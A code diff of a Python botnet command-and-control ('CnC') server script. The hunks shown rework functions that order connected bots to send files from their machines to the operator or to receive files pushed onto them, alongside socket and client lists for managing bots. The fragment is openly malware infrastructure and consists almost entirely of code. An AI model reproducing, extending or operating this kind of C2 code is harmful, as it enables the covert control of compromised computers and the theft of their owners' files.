@@ -1,3 +1,5 @@
+# CnC server
+
 #!/usr/bin/env python3
 
 import sys
@@ -16,7 +18,7 @@ socks = []
 clients = []
 active = False
 
-# CnC server requires bot to send file
+# server requires bot to send file
 def download(sock, file):
   Send(sock, 'download ' + file)
   pr('Downloading ' + file)
@@ -31,24 +33,24 @@ def download(sock, file):
   f.write(d)
   f.close()
 
-# CnC server requires bot to receive file
+# server requires bot to receive file
 def upload(sock, file):
-    try:
-        f = open(file, 'rb')
-    except IOError:
-        pr('Error opening file.')
-        return
+  Send(sock, 'upload ' + file)
+  pr('Uploading ' + file)
 
-    Send(sock, 'upload ' + file)
-    pr('Uploading ' + file)
+  try:
+    f = open(file, 'rb')
+  except IOError:
+    pr('Error opening file.')
+    return
 
-    while True:
-        d = f.read()
-        if not d: 
-            break
-        Send(sock, d, '')
+  while True:
+    d = f.read()
+    if not d: 
+      break
+    Send(sock, d, '')
 
-    f.close()
+  f.close()
 
 def refresh():
   clear()
